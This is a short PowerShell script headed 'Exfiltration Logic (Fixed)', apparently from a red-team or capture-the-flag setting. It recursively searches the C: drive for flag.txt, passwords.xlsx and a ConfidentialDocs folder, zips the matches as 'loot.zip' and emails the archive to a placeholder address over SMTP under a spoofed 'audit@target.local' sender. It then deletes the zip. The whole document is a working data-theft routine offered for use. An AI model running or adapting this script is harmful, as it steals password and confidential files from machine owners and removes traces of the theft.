# Exfiltration Logic (Fixed)

$path = "C:\"
$targets = @("flag.txt", "passwords.xlsx", "ConfidentialDocs")

# FIX: Use Sort-Object to remove duplicates while keeping the full object data (path).
$foundItems = Get-ChildItem -Path $path -Recurse -Include $targets -ErrorAction SilentlyContinue | Sort-Object -Property Name -Unique

if ($foundItems) {
    $zipPath = "$env:TEMP\loot.zip"
    Compress-Archive -Path $foundItems.FullName -DestinationPath $zipPath -Force

    $mailParams = @{
        To          = "YOUR_EMAIL@EXAMPLE.COM"
        From        = "audit@target.local"
        Subject     = "Audit Loot Found"
        Body        = "Found items: $($foundItems.Name -join ', ')"
        SmtpServer  = "smtp.example.com"
        Attachments = $zipPath
    }
    Send-MailMessage @mailParams

    Remove-Item $zipPath -ErrorAction SilentlyContinue
}
